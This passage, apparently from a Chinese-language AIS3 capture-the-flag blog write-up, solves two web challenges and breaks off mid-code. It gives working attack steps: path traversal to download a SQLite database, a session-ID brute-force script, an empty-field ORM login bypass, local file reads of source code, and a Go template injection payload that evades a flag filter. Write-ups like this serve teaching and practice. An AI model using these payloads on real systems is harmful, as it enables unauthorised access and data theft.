class="string">&quot;username&quot;</span>] = <span class="string">&quot;admin&quot;</span></span><br><span class="line">            request.session[<span class="string">&quot;2fa_passed&quot;</span>] = <span class="literal">False</span></span><br><span class="line">            code = random.randint(<span class="number">100000</span>, <span class="number">2</span>**<span class="number">1024</span>)</span><br><span class="line">            request.session[<span class="string">&quot;2fa_code&quot;</span>] = code</span><br><span class="line">            logging.warning(<span class="string">f&#x27;2FA code: <span class="subst">&#123;code&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(_2fa)</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">f&#x27;/login?error=Invalid username/password&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">&quot;login.html&quot;</span>, &#123;<span class="string">&quot;error&quot;</span>: request.GET.get(<span class="string">&quot;error&quot;</span>), <span class="string">&#x27;form&#x27;</span>: LoginForm()&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_2fa</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> request.session.get(<span class="string">&quot;username&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/login&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> request.session.get(<span class="string">&quot;2fa_passed&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/dashboard&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        form = _2faForm(request.POST)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> form.is_valid():</span><br><span class="line">            <span class="keyword">return</span> redirect(<span class="string">f&#x27;https://www.youtube.com/watch?v=W8DCWI_Gc9c&#x27;</span>)</span><br><span class="line">        code = request.session.get(<span class="string">&quot;2fa_code&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> form.cleaned_data[<span class="string">&#x27;code&#x27;</span>] == <span class="built_in">str</span>(code):</span><br><span class="line">            request.session[<span class="string">&quot;2fa_passed&quot;</span>] = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span> redirect(<span class="string">&quot;/dashboard&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/2fa?error=Invalid code&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">&quot;2fa.html&quot;</span>, &#123;<span class="string">&quot;error&quot;</span>: request.GET.get(<span class="string">&quot;error&quot;</span>)&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dashboard</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> request.session.get(<span class="string">&quot;username&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> redirect(login)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> request.session.get(<span class="string">&quot;2fa_passed&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> redirect(login)</span><br><span class="line">    FLAG = os.environ.get(<span class="string">&quot;FLAG&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">&quot;dashboard.html&quot;</span>, &#123;<span class="string">&quot;username&quot;</span>: request.session.get(<span class="string">&quot;username&quot;</span>), <span class="string">&quot;FLAG&quot;</span>: FLAG&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">image</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="comment"># return the b64decoded image of file parameter</span></span><br><span class="line">    path = request.GET.get(<span class="string">&quot;file&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> path:</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(<span class="string">&quot;No file specified&quot;</span>, status=<span class="number">400</span>)</span><br><span class="line">    path = b64decode(path).decode()</span><br><span class="line">    </span><br><span class="line">    path = os.path.join(<span class="string">&#x27;/loginPanel&#x27;</span>, path)</span><br><span class="line">    path = os.path.normpath(path)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># prevent directory traversal</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> path.startswith(<span class="string">&#x27;/loginPanel&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(<span class="string">&quot;Invalid file&quot;</span>, status=<span class="number">400</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># read the file</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># return the file</span></span><br><span class="line">    <span class="keyword">return</span> HttpResponse(data, content_type=<span class="string">&quot;image/png&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>(<span class="params">request</span>):</span><br><span class="line">    request.session.flush()</span><br><span class="line">    <span class="keyword">return</span> redirect(login)</span><br></pre></td></tr></table></figure>
<p>再去看<code>settings.py</code>中這一段：  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DATABASES = &#123;</span><br><span class="line">    <span class="string">&#x27;default&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;ENGINE&#x27;</span>: <span class="string">&#x27;django.db.backends.sqlite3&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;NAME&#x27;</span>: BASE_DIR / <span class="string">&#x27;db.sqlite3&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>結合剛剛<code>views.py</code>中<code>image</code>的函數，可以下載<code>db.sqlite3</code>下來：  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://chals1.ais3.org:36743/image/?file=ZGIuc3FsaXRlMw== -O db.sqlite3</span><br></pre></td></tr></table></figure>
<p>接著利用腳本讀取db.sqlite3：<br><strong>checksql.py</strong>  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_sql_content</span>(<span class="params">database_file</span>):</span><br><span class="line">    os.system(<span class="string">f&#x27;if [ -f &quot;<span class="subst">&#123;database_file&#125;</span>&quot; ]; then    echo &quot;File exists: <span class="subst">&#123;database_file&#125;</span>&quot;;fi&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        conn = sqlite3.connect(database_file)</span><br><span class="line">        cursor = conn.cursor()</span><br><span class="line">        cursor.execute(<span class="string">&quot;SELECT name FROM sqlite_master WHERE type=&#x27;table&#x27;;&quot;</span>)</span><br><span class="line">        tables = cursor.fetchall()</span><br><span class="line">        <span class="keyword">for</span> table <span class="keyword">in</span> tables:</span><br><span class="line">            table_name = table[<span class="number">0</span>]</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Table: <span class="subst">&#123;table_name&#125;</span>&quot;</span>)</span><br><span class="line">            cursor.execute(<span class="string">f&quot;SELECT * FROM <span class="subst">&#123;table_name&#125;</span>;&quot;</span>)</span><br><span class="line">            rows = cursor.fetchall()</span><br><span class="line">            <span class="keyword">for</span> row <span class="keyword">in</span> rows:</span><br><span class="line">                <span class="built_in">print</span>(row)</span><br><span class="line">        conn.close()</span><br><span class="line">    <span class="keyword">except</span> sqlite3.Error <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;SQLite error:&quot;</span>, e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;Print the content of an SQLite3 database file.&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;--sql&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;Path to the SQLite3 database file, usage: --sql=blog.sql&quot;</span>, required=<span class="literal">True</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    print_sql_content(args.sql)</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/rJInHNx4C.png" alt="image">  </p>
<p>其中，<code>django_session</code>的Table存放了所有session，結合目前已經有一個選手解出這題，當中必然有一個session是被認證過的，把所有session彙整到wordlist.txt後寫腳本暴力即可獲得flag：<br><strong>exp.py</strong>  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;wordlist.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">wordlist=f.read().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> wordlist:</span><br><span class="line">    text=os.popen(<span class="string">f&#x27;curl -i http://chals1.ais3.org:36743/dashboard/ --cookie &quot;sessionid=<span class="subst">&#123;i&#125;</span>&quot;&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;/login/&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> text:</span><br><span class="line">        <span class="built_in">print</span>(text)</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/ByCuBVg4R.png" alt="image">  </p>
<blockquote>
<p>Flag:AIS3{Yet_An0th3r_l0gin_pan3l_c2hbKnXIa_c!!!!!}</p>
</blockquote>
<h4 id="Capoost"><a href="#Capoost" class="headerlink" title="Capoost"></a>Capoost</h4><p>一個黑箱的web題，登入後經過嘗試會發現讀取模板的參數有LFI，嘗試讀取Dockerfile：<br><code>/template/read?name=../Dockerfile</code>  </p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> golang:<span class="number">1.19</span> as builder</span><br><span class="line"></span><br><span class="line"><span class="keyword">LABEL</span><span class="language-bash"> maintainer=<span class="string">&quot;Chumy&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt install make</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> src /app</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> Dockerfile-easy /app/Dockerfile</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /app</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> make clean &amp;&amp; make &amp;&amp; make readflag &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">mv</span> bin/readflag /readflag &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">mv</span> fl4g1337 /fl4g1337 &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chown</span> root:root /readflag &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chmod</span> 4555 /readflag &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chown</span> root:root /fl4g1337 &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chmod</span> 400 /fl4g1337 &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">touch</span> .<span class="built_in">env</span> &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    useradd -m -s /bin/bash app &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chown</span> -R app:app /app</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">USER</span> app</span><br><span class="line"></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;./bin/capoost&quot;</span>]</span></span><br></pre></td></tr></table></figure>
<p>發現網站是由GoLANG寫成的，嘗試讀取<code>main.go</code>：<br><code>/template/read?name=../main.go</code>  </p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="comment">//    &quot;net/http&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/gin-contrib/sessions&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/gin-contrib/sessions/cookie&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/go-errors/errors&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;capoost/router&quot;</span></span><br><span class="line">    <span class="string">&quot;capoost/utils/config&quot;</span></span><br><span class="line"><span class="comment">//    &quot;capoost/utils/database&quot;</span></span><br><span class="line">    <span class="string">&quot;capoost/utils/errutil&quot;</span></span><br><span class="line">    <span class="string">&quot;capoost/middlewares/auth&quot;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>注意到每個.go的檔案都會有import，就可以從這裡面找到需要的檔案路徑位置。<br><strong>Login Bypass</strong><br>注意到<code>models/user/user.go</code>中的init()以及Login()函數</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">const</span> adminname = <span class="string">&quot;4dm1n1337&quot;</span></span><br><span class="line">    database.GetDB().AutoMigrate(&amp;User&#123;&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> _, err := GetUser(adminname); err == <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    buf := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">12</span>)</span><br><span class="line">    _, err := rand.Read(buf)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Panicf(<span class="string">&quot;error while generating random string: %s&quot;</span>, err)</span><br><span class="line">    &#125;</span><br><span class="line">    User&#123;</span><br><span class="line">        <span class="comment">//ID: 1,</span></span><br><span class="line">        Username: adminname,</span><br><span class="line">        Password: password.New(base64.StdEncoding.EncodeToString(buf)),</span><br><span class="line">    &#125;.Create()</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(user User)</span></span> Login() <span class="type">bool</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> user.Username == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> _, err := GetUser(user.Username); err == <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> loginuser User</span><br><span class="line">        result := database.GetDB().Where(&amp;user).First(&amp;loginuser)</span><br><span class="line">        <span class="keyword">return</span> result.Error == <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> user.Create() == <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以得到兩個訊息：  </p>
<ol>
<li>管理員名稱是<code>4dm1n1337</code>  </li>
<li>管理登入的函數動用到sql的部分接受傳入空資料<br>關於第二點，可以透過<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13870?time__1311=mqmxnQG=KQTqlxGgx+xCq=OOO4xWuhD&alichlgref=https://www.google.com/">這篇文章</a>找到利用細節，會返回第一個元素，也就是ID&#x3D;1的管理員帳號<br><img src="https://hackmd.io/_uploads/SJ7GYa-ER.png" alt="image"></li>
</ol>
<p><img src="https://hackmd.io/_uploads/HyEQFTZVC.png" alt="image">  </p>
<p><strong>SSTI</strong><br>觀察<code>router/template/template.go</code>  </p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Init</span><span class="params">(r *gin.RouterGroup)</span></span> &#123;</span><br><span class="line">    router = r</span><br><span class="line">    router.POST(<span class="string">&quot;/upload&quot;</span>, auth.CheckSignIn, auth.CheckIsAdmin, upload)</span><br><span class="line">    router.GET(<span class="string">&quot;/list&quot;</span>, auth.CheckSignIn, list)</span><br><span class="line">    router.GET(<span class="string">&quot;/read&quot;</span>, auth.CheckSignIn, read)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">upload</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">    reg := regexp.MustCompile(<span class="string">`[^a-zA-Z0-9]`</span>)</span><br><span class="line">    template := c.PostForm(<span class="string">&quot;template&quot;</span>)</span><br><span class="line">    name := reg.ReplaceAllString(c.PostForm(<span class="string">&quot;name&quot;</span>), <span class="string">&quot;&quot;</span>)</span><br><span class="line">    f, err := os.Create(path.Clean(path.Join(<span class="string">&quot;./template&quot;</span>, name)))</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line">    _, err = f.WriteString(template)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line">    c.String(<span class="number">200</span>, <span class="string">&quot;Upload success&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以利用剛剛拿到的admin上傳template進行SSTI，但是GO SSTI只在內建或者已定義函數的情況下成立，不過剛好有一個gadget在<code>post.go</code>：  </p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">read</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">    postid, err := strconv.Atoi(c.DefaultQuery(<span class="string">&quot;id&quot;</span>, <span class="string">&quot;0&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        errutil.AbortAndError(c, &amp;errutil.Err&#123;</span><br><span class="line">            Code: <span class="number">400</span>,</span><br><span class="line">            Msg: <span class="string">&quot;Invalid ID&quot;</span>,</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    nowpost, err := post.GetPost(<span class="type">uint</span>(postid))</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        errutil.AbortAndError(c, &amp;errutil.Err&#123;</span><br><span class="line">            Code: <span class="number">400</span>,</span><br><span class="line">            Msg: <span class="string">&quot;Invalid ID&quot;</span>,</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    t := template.New(nowpost.Template)</span><br><span class="line">    <span class="keyword">if</span> nowpost.Owner.ID == <span class="number">1</span> &#123;</span><br><span class="line">        t = t.Funcs(template.FuncMap&#123;</span><br><span class="line">            <span class="string">&quot;G1V3m34Fl4gpL34s3&quot;</span>: readflag,</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    t = template.Must(t.ParseFiles(path.Join(<span class="string">&quot;./template&quot;</span>, nowpost.Template)))</span><br><span class="line">    b := <span class="built_in">new</span>(bytes.Buffer)</span><br><span class="line">    <span class="keyword">if</span> err = t.Execute(b, nowpost.Data); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line">    nowpost.Count++</span><br><span class="line">    sum := <span class="number">0</span></span><br><span class="line">    posts, _ := post.GetAllPosts()</span><br><span class="line">    <span class="keyword">for</span> _, now := <span class="keyword">range</span> posts &#123;</span><br><span class="line">        <span class="keyword">if</span> nowpost.ID == now.ID &#123;</span><br><span class="line">            sum += nowpost.Count</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            sum += now.Count</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> percent <span class="type">int</span> </span><br><span class="line">    <span class="keyword">if</span> sum != <span class="number">0</span> &#123;</span><br><span class="line">        percent = (nowpost.Count * <span class="number">100</span>) / sum</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        errutil.AbortAndError(c, &amp;errutil.Err&#123;</span><br><span class="line">            Code: <span class="number">500</span>,</span><br><span class="line">            Msg: <span class="string">&quot;Sum of post count can&#x27;t be 0&quot;</span>,</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> strings.Contains(b.String(), <span class="string">&quot;AIS3&quot;</span>) &#123;</span><br><span class="line">        errutil.AbortAndError(c, &amp;errutil.Err&#123;</span><br><span class="line">            Code: <span class="number">403</span>,</span><br><span class="line">            Msg: <span class="string">&quot;Flag deny&quot;</span>,</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    nowpage := page&#123;</span><br><span class="line">        Data: b.String(),</span><br><span class="line">        Count: nowpost.Count,</span><br><span class="line">        Percent: percent,</span><br><span class="line">    &#125;</span><br><span class="line">    c.JSON(<span class="number">200</span>, nowpage)</span><br><span class="line">    database.GetDB().Save(&amp;nowpost)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">readflag</span><span class="params">()</span></span> <span class="type">string</span> &#123;</span><br><span class="line">    out, _ := exec.Command(<span class="string">&quot;/readflag&quot;</span>).Output()</span><br><span class="line">    <span class="keyword">return</span> strings.Trim(<span class="type">string</span>(out), <span class="string">&quot; \n\t&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由裡面的FuncMap得知，如果template解析到<code>G1V3m34Fl4gpL34s3</code>，而且貼出來的人是管理員，那它會噴flag出來。<br>有兩個小問題，第一個是禁止把AIS3這幾個字母帶出來，但可以用GO內建的slice函數繞過，所以打進去的template應該要是：<code>&#123;&#123;slice  G1V3m34Fl4gpL34s3 2&#125;&#125;</code><br>第二個問題是<code>/post/create</code>有禁止管理員造訪：  </p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Init</span><span class="params">(r *gin.RouterGroup)</span></span> &#123;</span><br><span class="line">    router = r</span><br><span class="line">    router.POST(<span class="string">&quot;/create&quot;</span>, auth.CheckSignIn, auth.CheckIsNotAdmin, create)</span><br><span class="line">    router.GET(<span class="string">&quot;/list&quot;</span>, auth.CheckSignIn, list)</span><br><span class="line">    router.GET(<span class="string">&quot;/read&quot;</span>, auth.CheckSignIn, read)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>json serialization pollution</strong><br>為了解決剛剛的問題，仔細觀察<code>router/post/post.go</code>以及<code>models/post/post.go</code>  </p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> postjson <span class="keyword">struct</span> &#123;</span><br><span class="line">    ID <span class="type">uint</span> <span class="string">`json:&quot;id&quot;`</span></span><br><span class="line">    Title <span class="type">string</span> <span class="string">`json:&quot;title&quot;`</span></span><br><span class="line">    Owner <span class="type">string</span> <span class="string">`json:&quot;owner&quot;`</span></span><br><span class="line">    Template <span class="type">string</span> <span class="string">`json:&quot;template&quot;`</span></span><br><span class="line">    Data PostDataMap <span class="string">`json:&quot;data&quot;`</span></span><br><span class="line">    Count <span class="type">int</span> <span class="string">`json:&quot;count&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">create</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">    userdata, _ := c.Get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    postdata := post.Post&#123;</span><br><span class="line">        Owner: userdata.(user.User),</span><br><span class="line">    &#125;</span><br><span class="line">    err := c.ShouldBindJSON(&amp;postdata)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> || postdata.Title == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">        errutil.AbortAndError(c, &amp;errutil.Err&#123;</span><br><span class="line">            Code: <span class="number">400</span>,</span><br><span class="line">            Msg: <span class="string">&quot;Invalid 